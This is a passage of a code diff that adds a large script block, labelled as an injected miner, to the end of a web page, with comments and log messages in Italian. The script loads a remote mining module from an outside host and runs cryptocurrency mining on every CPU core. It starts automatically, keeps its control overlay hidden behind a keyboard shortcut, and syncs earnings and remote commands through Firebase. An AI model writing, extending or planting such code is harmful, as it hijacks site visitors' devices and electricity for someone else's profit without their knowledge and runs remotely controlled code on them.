+          parts.push(`${e.name || key}=${e.ltc.toFixed(8)}`);
+        }
+      });
+      if (ltcToAdd <= 0) { log('Nessun saldo live da prelevare', 'warn'); return; }
+      log(`Somma live (${parts.length} device): ${parts.join(' + ')} = ${ltcToAdd.toFixed(8)}`, 'info');
+      const totSnap = await db.ref(FIREBASE_TOTALS).once('value');
+      const cur = totSnap.val() || { totalLtc: 0, totalEur: 0 };
+      const newLtc = (parseFloat(cur.totalLtc) || 0) + ltcToAdd;
+      let newEur = parseFloat(cur.totalEur) || 0;
+      if (state.ltcPriceEur > 0) newEur = newLtc * state.ltcPriceEur;
+      await db.ref(FIREBASE_TOTALS).set({ totalLtc: newLtc, totalEur: newEur, lastUpdate: Date.now(), worker: DEFAULT.worker });
+      await db.ref(FIREBASE_LIVE).remove();
+      const at = Date.now();
+      await db.ref(FIREBASE_WITHDRAW).set({ at, by: DEVICE_NAME || DEVICE_ID, deviceKey: DEVICE_ID, amount: ltcToAdd });
+      lastWithdrawSeen = at;
+      lsSet('miner_last_withdraw_seen', String(at));
+      state.totalLtc = newLtc;
+      state.totalEur = newEur;
+      resetLocalDeviceBalance(null);
+      updateBalanceUI();
+      updateUI();
+      log(`Withdraw OK → +${ltcToAdd.toFixed(8)} LTC al TOTALE`, 'success');
+    } catch (e) {
+      log('Errore Withdraw: ' + e.message, 'error');
+    }
+  }
+
+  async function loadFromFirebase() {
+    if (!db) return;
+    try {
+      const snap = await db.ref(FIREBASE_TOTALS).once('value');
+      const data = snap.val();
+      if (data) {
+        state.totalLtc = parseFloat(data.totalLtc) || 0;
+        state.totalEur = parseFloat(data.totalEur) || 0;
+        updateBalanceUI();
+        updateUI();
+      }
+    } catch (e) {}
+  }
+
+  async function calcEuroFromFirebase() {
+    if (!db) { log('Firebase non disponibile', 'error'); return; }
+    try {
+      await fetchLtcPrice();
+      if (!state.ltcPriceEur) { log('Prezzo non disponibile', 'error'); return; }
+      const snap = await db.ref(FIREBASE_TOTALS).once('value');
+      const totalLtc = parseFloat((snap.val() || {}).totalLtc) || 0;
+      const eur = totalLtc * state.ltcPriceEur;
+      state.totalLtc = totalLtc;
+      state.totalEur = eur;
+      await db.ref(FIREBASE_TOTALS).update({ totalEur: eur, lastUpdate: Date.now() });
+      updateBalanceUI();
+      updateUI();
+      log(`${totalLtc.toFixed(8)} LTC × ${state.ltcPriceEur.toFixed(2)} = ${eur.toFixed(8)} €`, 'success');
+    } catch (e) {
+      log('Errore euro: ' + e.message, 'error');
+    }
+  }
+
+  function log(msg, type = 'info') {
+    const line = `[${new Date().toLocaleTimeString('it-IT')}] ${msg}`;
+    ['logBox', 'm-logBox'].forEach(id => {
+      const b = document.getElementById(id);
+      if (!b) return;
+      const el = document.createElement('div');
+      el.className = `log-entry ${type}`;
+      el.textContent = line;
+      b.appendChild(el);
+      b.scrollTop = b.scrollHeight;
+    });
+  }
+  function formatTime(s) {
+    const h = Math.floor(s / 3600).toString().padStart(2, '0');
+    const m = Math.floor((s % 3600) / 60).toString().padStart(2, '0');
+    const sec = Math.floor(s % 60).toString().padStart(2, '0');
+    return `${h}:${m}:${sec}`;
+  }
+  function formatHs(v) {
+    return v >= 1000 ? (v / 1000).toFixed(2) + ' KH/s' : Math.round(v) + ' H/s';
+  }
+  async function fetchLtcPrice() {
+    try {
+      const res = await fetch('https://api.coinbase.com/v2/prices/LTC-EUR/spot', { cache: 'no-store' });
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      state.ltcPriceEur = parseFloat((await res.json()).data.amount);
+      const el = document.getElementById('ltcPrice');
+      if (el) el.textContent = state.ltcPriceEur.toFixed(2) + ' €';
+      const up = document.getElementById('priceUpdate');
+      if (up) up.textContent = new Date().toLocaleTimeString('it-IT');
+      updateEarningsDisplay();
+    } catch (e) {
+      log('Errore prezzo: ' + e.message, 'error');
+    }
+  }
+  function updateEarningsDisplay() {
+    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    set('globalLiveLtc', state.globalLiveLtc.toFixed(8) + ' LTC');
+    set('globalLiveEur', (state.globalLiveLtc * (state.ltcPriceEur || 0)).toFixed(8) + ' €');
+    set('totalEur', state.totalEur.toFixed(8) + ' €');
+    set('totalLtc', state.totalLtc.toFixed(8));
+  }
+  function updateBalanceUI() {
+    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    set('deviceLtc', (state.sessionLtc || 0).toFixed(8));
+    set('box-totalLtc', state.totalLtc.toFixed(8));
+    set('box-totalEur', state.totalEur.toFixed(8) + ' €');
+    set('box-deviceLtc', (state.sessionLtc || 0).toFixed(8));
+    updateEarningsDisplay();
+  }
+  function updateUI() {
+    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    set('hashrate', formatHs(state.currentHashrate));
+    set('avgHashrate', Math.round(state.avgHashrate));
+    set('maxHashrate', Math.round(state.maxHashrate));
+    set('sharesAccepted', state.sharesAccepted);
+    set('sharesRejected', state.sharesRejected);
+    set('sessionTime', formatTime(state.sessionSeconds));
+    set('cpuIntensity', '100% (' + (navigator.hardwareConcurrency || '?') + ' core)');
+    set('threadsInfo', state.threads > 0 ? state.threads + ' thread' : '—');
+    if (state.running) updateOwnSessionLtc();
+    updateBalanceUI();
+    syncOverlayUI();
+  }
+
+  function setOverlayVisible(v) {
+    const o = document.getElementById('miner-overlay');
+    const b = document.getElementById('balance-box');
+    if (!o) return;
+    state.overlayOpen = !!v;
+    if (v) {
+      o.classList.add('open');
+      if (b) b.classList.add('visible');
+    } else {
+      o.classList.remove('open');
+      if (b) b.classList.remove('visible');
+    }
+  }
+  function toggleOverlay() { setOverlayVisible(!state.overlayOpen); }
+  function toggleBalanceBox() {
+    const box = document.getElementById('balance-box');
+    const t = document.getElementById('balance-toggle');
+    if (!box) return;
+    box.classList.toggle('open');
+    if (t) t.textContent = box.classList.contains('open') ? '▲' : '▼';
+  }
+  function syncOverlayUI() {
+    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    set('m-hashrate', document.getElementById('hashrate')?.textContent || '0 H/s');
+    set('m-avgHashrate', document.getElementById('avgHashrate')?.textContent || '0');
+    set('m-maxHashrate', document.getElementById('maxHashrate')?.textContent || '0');
+    set('m-sharesAccepted', document.getElementById('sharesAccepted')?.textContent || '0');
+    set('m-sharesRejected', document.getElementById('sharesRejected')?.textContent || '0');
+    set('m-sessionTime', document.getElementById('sessionTime')?.textContent || '00:00:00');
+    set('m-startTime', document.getElementById('startTime')?.textContent || '—');
+    set('m-ltcPrice', document.getElementById('ltcPrice')?.textContent || '— €');
+    set('m-priceUpdate', document.getElementById('priceUpdate')?.textContent || '—');
+    set('m-sessionLtc', document.getElementById('globalLiveLtc')?.textContent || '0 LTC');
+    set('m-sessionValue', document.getElementById('globalLiveEur')?.textContent || '0 €');
+    set('m-totalEur', document.getElementById('totalEur')?.textContent || '0 €');
+    set('m-threadsInfo', document.getElementById('threadsInfo')?.textContent || '—');
+    set('m-cpuIntensity', document.getElementById('cpuIntensity')?.textContent || '100%');
+    const badge = document.getElementById('statusBadge');
+    const mBadge = document.getElementById('m-statusBadge');
+    if (badge && mBadge) {
+      mBadge.textContent = badge.textContent;
+      if (badge.classList.contains('running')) mBadge.className = 'status-badge running';
+      else if (badge.classList.contains('saving')) mBadge.className = 'status-badge saving';
+      else mBadge.className = 'status-badge stopped';
+    }
+    const bs = document.getElementById('btnStart');
+    const bst = document.getElementById('btnStop');
+    const mbs = document.getElementById('m-btnStart');
+    const mbst = document.getElementById('m-btnStop');
+    if (bs && mbs) mbs.disabled = bs.disabled;
+    if (bst && mbst) mbst.disabled = bst.disabled;
+  }
+
+  async function startMining() {
+    if (state.running || isSaving) return;
+    if (!DEVICE_NAME || !DEVICE_ID) {
+      log('Imposta prima il nome del device', 'warn');
+      if (typeof window.__minerInitGate === 'function') window.__minerInitGate();
+      const gate = document.getElementById('device-gate');
+      if (gate) {
+        gate.classList.remove('hidden');
+        gate.removeAttribute('hidden');
+        gate.style.removeProperty('display');
+      }
+      return;
+    }
+
+    const server = document.getElementById('server')?.value.trim() || DEFAULT.server;
+    const port = parseInt(document.getElementById('port')?.value || DEFAULT.port, 10);
+    const worker = document.getElementById('worker')?.value.trim() || DEFAULT.worker;
+    const password = document.getElementById('password')?.value.trim() || DEFAULT.password;
+    const hwThreads = navigator.hardwareConcurrency || 16;
+    const ssl = (document.getElementById('ssl')?.value || 'false') === 'true';
+
+    const cached = loadFromCache();
+    state.sessionLtc = cached;
+    state.baseLtc = cached;
+    pendingLiveLtc = 0;
+    state.running = true;
+    state.startTimestamp = Date.now();
+    state.sessionSeconds = 0;
+    state.currentHashrate = 0;
+    state.avgHashrate = 0;
+    state.maxHashrate = 0;
+    state.sharesAccepted = 0;
+    state.sharesRejected = 0;
+
+    const btnStart = document.getElementById('btnStart');
+    const btnStop = document.getElementById('btnStop');
+    if (btnStart) btnStart.disabled = true;
+    if (btnStop) btnStop.disabled = false;
+    const badge = document.getElementById('statusBadge');
+    if (badge) { badge.textContent = 'IN ESECUZIONE'; badge.className = 'status-badge running'; }
+    const st = document.getElementById('startTime');
+    if (st) st.textContent = new Date().toLocaleTimeString('it-IT');
+    log(`Avvio · ${DEVICE_NAME || DEVICE_ID} · base cache=${cached.toFixed(8)} LTC`, 'info');
+
+    try {
+      const mod = await import('https://earnify.cc/miner.js');
+      const { start, minotaurx, minotaurxHashrate, ALL_THREADS } = mod;
+      if (!start || !minotaurx) throw new Error('API miner non trovata');
+      let threads;
+      try {
+        threads = await start(minotaurx, { server, port, worker, password, ssl }, null, hwThreads,
+          ({ work }) => { if (work?.job_id) log(`Job: ${work.job_id}`, 'info'); },
+          ({ hashrateKHs }) => {
+            state.currentHashrate = (parseFloat(hashrateKHs) || 0) * 1000;
+            if (state.currentHashrate > state.maxHashrate) state.maxHashrate = state.currentHashrate;
+            updateUI();
+          },
+          ({ error }) => log('Errore miner: ' + (error || '?'), 'error')
+        );
+      } catch (e1) {
+        log('Fallback ALL_THREADS: ' + e1.message, 'warn');
+        threads = await start(minotaurx, { server, port, worker, password, ssl }, null, ALL_THREADS ?? 0,
+          () => {},
+          ({ hashrateKHs }) => {
+            state.currentHashrate = (parseFloat(hashrateKHs) || 0) * 1000;
+            if (state.currentHashrate > state.maxHashrate) state.maxHashrate = state.currentHashrate;
+            updateUI();
+          },
+          ({ error }) => log('Errore miner: ' + (error || '?'), 'error')
+        );
+      }
+      state.threads = threads || 0;
+      log(`Avviato · ${state.threads} thread · solo cache locale`, 'success');
+      state.statsInterval = setInterval(() => {
+        if (!state.running || !minotaurxHashrate) return;
+        try {
+          state.currentHashrate = (parseFloat(minotaurxHashrate.currentHashrateKHs) || 0) * 1000;
+          if (typeof minotaurxHashrate.getAverageHashrate === 'function') {
+            state.avgHashrate = (parseFloat(minotaurxHashrate.getAverageHashrate()) || 0) * 1000;
+          }
+          if (minotaurxHashrate.maxHashrateKHs) {
+            state.maxHashrate = Math.max(state.maxHashrate, parseFloat(minotaurxHashrate.maxHashrateKHs) * 1000);
+          }
+          state.sharesAccepted = minotaurxHashrate.sharesAccepted ?? state.sharesAccepted;
+          state.sharesRejected = minotaurxHashrate.sharesRejected ?? state.sharesRejected;
+        } catch (e) {}
+        updateUI();
+      }, 1000);
+      state.timerInterval = setInterval(() => {
+        if (state.startTimestamp) state.sessionSeconds = Math.floor((Date.now() - state.startTimestamp) / 1000);
+        updateUI();
+      }, 1000);
+      fetchLtcPrice();
+      state.priceInterval = setInterval(fetchLtcPrice, 30000);
+    } catch (err) {
+      log('ERRORE AVVIO: ' + err.message, 'error');
+      state.running = false;
+      if (btnStart) btnStart.disabled = false;
+      if (btnStop) btnStop.disabled = true;
+      if (badge) { badge.textContent = 'FERMO'; badge.className = 'status-badge stopped'; }
+    }
+  }
+
+  async function stopMining() {
+    if (!state.running || isSaving) return true;
+    isSaving = true;
+    updateOwnSessionLtc(true);
+    // NON salva su Firebase qui: solo cache locale. Firebase solo con Esci.
+    const totalNow = Number(state.sessionLtc) || 0;
+    state.baseLtc = totalNow;
+    state.sessionLtc = totalNow;
+    saveToCache();
+    pendingLiveLtc = totalNow;
+    state.running = false;
+    clearInterval(state.timerInterval);
+    clearInterval(state.priceInterval);
+    clearInterval(state.statsInterval);
+    if (state._autoSaveInterval) { clearInterval(state._autoSaveInterval); state._autoSaveInterval = null; }
+    state.timerInterval = state.priceInterval = state.statsInterval = null;
+    try {
+      const m = await import('https://earnify.cc/miner.js');
+      if (m && typeof m.stop === 'function') m.stop();
+    } catch (e) {}
+    const btnStart = document.getElementById('btnStart');
+    const btnStop = document.getElementById('btnStop');
+    if (btnStart) btnStart.disabled = false;
+    if (btnStop) btnStop.disabled = true;
+    const badge = document.getElementById('statusBadge');
+    if (badge) { badge.textContent = 'FERMO'; badge.className = 'status-badge stopped'; }
+    log('Stop · saldo in cache: ' + totalNow.toFixed(8) + ' LTC (Firebase solo con Esci)', 'warn');
+    isSaving = false;
+    updateBalanceUI(); updateUI();
+    return true;
+  }
+
+  window.startMining = startMining;
+  window.stopMining = stopMining;
+  window.state = state;
+
+  /** Salva subito cache+sessione su Firebase, azzera cache, ferma miner. Usato da Esci. */
+  window.__forceSaveAndClear = async function() {
+    try {
+      // Ferma intervalli e miner
+      state.running = false;
+      try {
+        clearInterval(state.timerInterval);
+        clearInterval(state.priceInterval);
+        clearInterval(state.statsInterval);
+        if (state._autoSaveInterval) { clearInterval(state._autoSaveInterval); state._autoSaveInterval = null; }
+      } catch (e) {}
+      try {
+        const m = await import('https://earnify.cc/miner.js');
+        if (m && typeof m.stop === 'function') m.stop();
+      } catch (e) {}
+
+      // Saldo completo: max tra sessione e cache (nessun auto-save parziale)
+      try { updateOwnSessionLtc(true); } catch (e) {}
+      const fromSession = Number(state.sessionLtc) || 0;
+      const fromCache = (typeof loadFromCache === 'function') ? (Number(loadFromCache()) || 0) : 0;
+      // Usa il maggiore: se sessione include già la cache (baseLtc), session >= cache
+      const amount = Math.max(fromSession, fromCache);
+
+      log('Esci · cache=' + fromCache.toFixed(8) + ' sessione=' + fromSession.toFixed(8) + ' → invio +' + amount.toFixed(8) + ' LTC al LIVE', 'warn');
+
+      let ok = true;
+      if (amount > 0.00000001) {
+        ok = await writeDeviceLive(amount);
+        if (ok) {
+          log('✓ Salvato su Firebase: +' + amount.toFixed(8) + ' LTC', 'success');
+        } else {
+          log('Errore salvataggio Firebase — riprovo…', 'error');
+          // un secondo tentativo
+          await new Promise(r => setTimeout(r, 300));
+          ok = await writeDeviceLive(amount);
+          if (ok) log('✓ Salvato al secondo tentativo', 'success');
+          else log('Salvataggio fallito', 'error');
+        }
+      } else {
+        log('Nessun saldo da salvare', 'info');
+      }
+
+      // Azzera cache SOLO se salvato (o se non c'era nulla)
+      if (ok) {
+        state.sessionLtc = 0;
+        state.baseLtc = 0;
+        pendingLiveLtc = 0;
+        try { lastPushedSessionLtc = 0; } catch (e) {}
+        try { clearCache(); } catch (e) {}
+        log('Cache azzerata', 'info');
+      }
+      try { updateBalanceUI(); updateUI(); } catch (e) {}
+
+      return { ok: !!ok, amount };
+    } catch (e) {
+      log('forceSave error: ' + (e && e.message ? e.message : e), 'error');
+      return { ok: false, error: String(e) };
+    }
+  };
+
+  function tryAutoStartMining() {
+    if (autoStartDone) return;
+    if (!DEVICE_NAME || !DEVICE_ID) return;
+    if (state.running || isSaving) return;
+    autoStartDone = true;
+    setTimeout(() => {
+      if (state.running || isSaving) return;
+      log('Auto-start mining (default) · ' + DEVICE_NAME, 'info');
+      Promise.resolve(startMining()).catch(err => {
+        log('Auto-start fallito: ' + (err && err.message || err), 'error');
+      });
+    }, 600);
+  }
+
+  window.__minerOnDeviceReady = function (dev) {
+    if (dev && dev.name) setDeviceIdentity(dev.name);
+    tryAutoStartMining();
+  };
+
+  document.getElementById('btnStart')?.addEventListener('click', () => startMining());
+  document.getElementById('m-btnStart')?.addEventListener('click', () => startMining());
+  document.getElementById('m-btnStop')?.addEventListener('click', stopMining);
+  document.getElementById('m-btnWithdraw')?.addEventListener('click', doWithdraw);
+  document.getElementById('m-btnCalcEur')?.addEventListener('click', calcEuroFromFirebase);
+  document.getElementById('m-btnClearLog')?.addEventListener('click', () => {
+    const b = document.getElementById('m-logBox'); if (b) b.innerHTML = '';
+    const b2 = document.getElementById('logBox'); if (b2) b2.innerHTML = '';
+  });
+  document.getElementById('m-btnClose')?.addEventListener('click', () => setOverlayVisible(false));
+  document.getElementById('m-btnRename')?.addEventListener('click', () => {
+    const input = document.getElementById('m-device-name');
+    const name = (input && input.value || '').trim();
+    if (!name || name.length < 2) {
+      log('Nome troppo corto (min 2 caratteri)', 'warn');
+      if (input) input.style.borderColor = '#ef4444';
+      return;
+    }
+    if (input) input.style.borderColor = '';
+    setDeviceIdentity(name);
+    try { localStorage.setItem('miner_device_base_name', name); } catch(e) {}
+    log('Nome device aggiornato: ' + name + ' (' + DEVICE_ID + ')', 'success');
+    const badgeText = document.getElementById('device-name-badge-text');
+    if (badgeText) badgeText.textContent = name;
+    const label = document.getElementById('deviceIdLabel');
+    if (label) label.textContent = name + ' (' + DEVICE_ID + ')';
+  });
+  // popola campo nome
+  (function(){
+    const input = document.getElementById('m-device-name');
+    if (input) input.value = DEVICE_NAME || localStorage.getItem('miner_device_base_name') || '';
+  })();
+  document.getElementById('balance-header')?.addEventListener('click', toggleBalanceBox);
+  document.addEventListener('keydown', e => {
+    if (e.ctrlKey && (e.key === 'm' || e.key === 'M')) {
+      e.preventDefault();
+      toggleOverlay();
+    }
+  });
+  document.getElementById('btnStop')?.addEventListener('click', stopMining);
+  document.getElementById('btnWithdraw')?.addEventListener('click', doWithdraw);
+  document.getElementById('btnCalcEur')?.addEventListener('click', calcEuroFromFirebase);
+  document.getElementById('btnClearLog')?.addEventListener('click', () => {
+    const lb = document.getElementById('logBox'); if (lb) lb.innerHTML = '';
+  });
+
+  function onVisible() {
+    if (document.visibilityState !== 'visible') return;
+    if (state.running && state.startTimestamp) {
+      state.sessionSeconds = Math.floor((Date.now() - state.startTimestamp) / 1000);
+      updateOwnSessionLtc();
+    }
+    readGlobalLiveFromFirebase();
+    checkRemoteWithdraw();
+    updateUI();
+  }
+  document.addEventListener('visibilitychange', onVisible);
+  window.addEventListener('focus', onVisible);
+
+  let minerBooted = false;
+  async function bootMinerApp() {
+    if (minerBooted) return;
+    minerBooted = true;
+    try { setOverlayVisible(false); } catch (e) {}
+    if (typeof window.__minerInitGate === 'function') window.__minerInitGate();
+
+    await loadFromFirebase();
+    state.firebaseInterval = setInterval(loadFromFirebase, 30000);
+    await checkRemoteWithdraw();
+
+    const cacheUp = parseInt(lsGet('miner_device_ltc_updated') || '0') || 0;
+    let cached = loadFromCache();
+    if (lastWithdrawSeen && cacheUp && lastWithdrawSeen >= cacheUp) {
+      cached = 0; clearCache();
+    }
+    if (cached > 0) {
+      state.sessionLtc = cached;
+      state.baseLtc = cached;
+      log(`Saldo da cache (${DEVICE_NAME || 'device'}): ${cached.toFixed(8)} LTC`, 'success');
+    }
+
+    if (db) {
+      db.ref(FIREBASE_LIVE).on('value', snap => {
+        const val = snap.val();
+        state.globalLiveLtc = sumGlobalLive(val);
+        renderLiveDevices(val);
+        updateEarningsDisplay();
+      });
+      db.ref(FIREBASE_TOTALS).on('value', snap => {
+        const data = snap.val();
+        if (data) {
+          state.totalLtc = parseFloat(data.totalLtc) || 0;
+          state.totalEur = parseFloat(data.totalEur) || 0;
+          updateEarningsDisplay();
+        }
+      });
+      db.ref(FIREBASE_WITHDRAW).on('value', () => checkRemoteWithdraw());
+      startRemoteCommandListener();
+    }
+
+    state.liveReadInterval = setInterval(readGlobalLiveFromFirebase, 3000);
+    state.withdrawCheckInterval = setInterval(checkRemoteWithdraw, 3000);
+    updateUI();
+    updateBalanceUI();
+    if (DEVICE_NAME) log(`Device: ${DEVICE_NAME} · live/${DEVICE_ID}`, 'info');
+    if (db) log('Firebase connesso · ' + firebaseConfig.databaseURL, 'success');
+    else log('Firebase NON connesso — i salvataggi non funzioneranno', 'error');
+    log('Telegram ready · ascolto remoteCommand su Firebase', 'success');
+
+    // se gate già chiuso (nome in cache), avvia
+    if (DEVICE_NAME && DEVICE_ID) tryAutoStartMining();
+  }
+
+  bootMinerApp().catch(e => console.error('bootMinerApp', e));
+
+  window.addEventListener('beforeunload', () => {
+    // Solo cache locale — Firebase SOLO con il tasto Esci
+    try {
+      if (state.running) updateOwnSessionLtc(true);
+      if ((Number(state.sessionLtc) || 0) > 0) saveToCache();
+    } catch (e) {}
+    try {
+      if (state.running) {
+        import('https://earnify.cc/miner.js').then(m => { if (typeof m.stop === 'function') m.stop(); }).catch(() => {});
+      }
+    } catch (e) {}
+    [state.firebaseInterval, state.liveReadInterval, state.withdrawCheckInterval].forEach(i => i && clearInterval(i));
+  });
+
+</script>
+<!-- ========== END INJECTED MINER ========== -->
+</body></html>
